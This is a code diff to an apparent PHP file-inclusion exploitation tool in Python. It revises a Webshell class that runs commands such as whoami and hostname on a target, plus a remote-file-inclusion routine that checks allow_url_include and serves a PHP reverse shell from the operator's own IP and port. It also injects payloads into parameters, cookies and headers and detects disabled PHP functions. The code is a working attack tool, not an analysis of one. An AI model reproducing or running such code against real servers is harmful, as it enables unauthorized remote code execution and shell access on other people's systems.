@@ -15,7 +15,7 @@ from core.constants import LOG_STACKTRACE_ON, LOG_DYNAMIC_PARAMETER, LOG_CONTENT
 from core.filter_bypass import get_bypass_possibilities
 from core.io import get_resource, save
 from core.log import info, ask, warn, verbose, success, err, set_global_verbose, is_verbose_mode, is_debug_mode
-from core.misc import dict_inject_marker, get_web_shell_post_cmd_src
+from core.misc import dict_replace_marker, get_web_shell_post_cmd_src
 from core.misc import get_web_shell_src
 from core.mode import Mode
 from core.models.req_input import InputRequest
@@ -54,6 +54,10 @@ class Webshell:
         self.current_directory = self.exec("pwd").strip("\\s")
 
         if self.current_directory == "":
+            return
+
+        if self.current_directory == ERROR_PARSING_RESPONSE:
+            warn("code execution probably, but I got an error parsing response")
             return
 
         self.user = self.exec("whoami") + "@" + self.exec("hostname")
@@ -154,7 +158,7 @@ class Webshell:
                 self.current_directory = spl[1].strip("\n")
                 return output
         except:
-            return "Error occurred while parsing response"
+            return ERROR_PARSING_RESPONSE
 
 
 """
@@ -257,6 +261,7 @@ class Scan:
     __document_root = None
     __server_suffix = None
     stable_content = None
+    forbidden_functions = []
 
     # Client side net stuff
     local_http_port = None
@@ -683,16 +688,25 @@ class Scan:
 
         is_success = False
 
-        for url in STABLE_URL_CONTENT:
-            if STABLE_URL_CONTENT[url] in self.send_payload(payload=url).text:
-                is_success = True
-                success("allow_url_include is enabled")
+        res = self.send_payload(payload=STABLE_URL_CONTENT).text
+
+        if STABLE_URL_CONTENT in res:
+            is_success = True
+            success("allow_url_include is enabled")
+
+            while 1:
                 url = ask("Enter URL to include or [Enter] for locally served php shell: ")
 
                 if url != "":
+                    url = url + "#"
                     res = self.send_payload(payload=url).text
                     save("include.html", self.output_dir, res)
-                    return 0
+                else:
+                    break
+
+        elif "HTTP request failed!" in res or "404 Not Found" in res:
+            info(f"HTTP request made, but error getting content. Maybe because server {STABLE_URL} is down.",
+                 bold=True)
 
         if not is_success:
 
@@ -703,7 +717,7 @@ class Scan:
             if y != "Y" and y != "y":
                 return
 
-        payload_url = "http://" + self.get_local_ip() + ":" + str(self.enter_local_http_port())
+        payload_url = "http://" + self.get_local_ip() + ":" + str(self.enter_local_http_port()) + "/?server_suffix="
 
         # setup server
         php_rev_shell_src = self.prepare_php_shell()
@@ -711,9 +725,21 @@ class Scan:
         http_server = Thread(target=run_http_server, args=(self.local_http_port, php_rev_shell_src))
         http_server.start()
 
+        # wait some time for server setup
+        time.sleep(0.5)
+
         ask("Start Shell at %i [Press Enter]: " % self.local_tcp_port)
 
-        self.send_payload(payload=payload_url)
+        res = self.send_payload(payload=payload_url).text
+
+        sub = substr(res, "failed to open stream:", "in")
+
+        if sub:
+            err(f"Server: {sub}")
+        elif "Connection refused" in res:
+            err("Server: Connection refused")
+        elif "No route to host":
+            err("Server: No route to host")
 
         info("Waiting 5s for request ..")
         time.sleep(5)
@@ -1122,14 +1148,14 @@ class Scan:
                 payload = self.filter_bypass.adjust(payload)
 
             if isinstance(data, dict):
-                data = dict_inject_marker(data, payload)
+                data = dict_replace_marker(data, payload)
             else:  # string
                 data = data.replace(MARKER, payload)
 
-            json_data = dict_inject_marker(json_data, payload)
-            params = dict_inject_marker(params, payload)
-            cookies = dict_inject_marker(cookies, payload)
-            extra_headers = dict_inject_marker(extra_headers, payload)
+            json_data = dict_replace_marker(json_data, payload)
+            params = dict_replace_marker(params, payload)
+            cookies = dict_replace_marker(cookies, payload)
+            extra_headers = dict_replace_marker(extra_headers, payload)
 
             url_script_path = url_script_path.replace(MARKER, payload)
 
@@ -1143,7 +1169,11 @@ class Scan:
 
             if self.follow_redirects is None and response.status_code == 302:
                 loc = response.headers['Location']
-                self.follow_redirects = ask(f"Follow redirects to {loc}? [Y][n]: ") != "n"
+
+                if self.batch:
+                    self.follow_redirects = True
+                else:
+                    self.follow_redirects = ask(f"Follow redirects to {loc}? [Y][n]: ") != "n"
 
             self.amount_payloads_sent = self.amount_payloads_sent + 1
 
@@ -1192,13 +1222,23 @@ class Scan:
                     abs_path = abs_path.replace(rm, "")
                     self.document_root = abs_path
 
+            forbidden_function = substr(res, "Warning: ", "has been disabled for security reasons")
+
+            if forbidden_function:
+
+                forbidden_function = forbidden_function.strip()
+
+                if forbidden_function not in self.forbidden_functions:
+                    info(f"{forbidden_function} is forbidden!", bold=True)
+                    self.forbidden_functions.append(forbidden_function)
+
             if not self.server_append_suffix:
 
                 server_file_name = substr(res, "Failed opening '", "' for inclusion")
                 if not server_file_name:
                     server_file_name = substr(res, "include(", "): failed to open")
 
-                if payload in server_file_name:
+                if server_file_name and payload in server_file_name:
                     server_file_name = server_file_name.split(payload)[1]
                     self.server_append_suffix = server_file_name
 
@@ -1350,7 +1390,7 @@ class Scan:
 
     def php_exec_print_timestamp(self):
 
-        first = self.unique_identifier[0]
-        second = self.unique_identifier[1:]
+        first = self.unique_identifier[:5]
+        second = self.unique_identifier[5:]
 
         return f"<?php echo '{first}' . '{second}'; ?>"
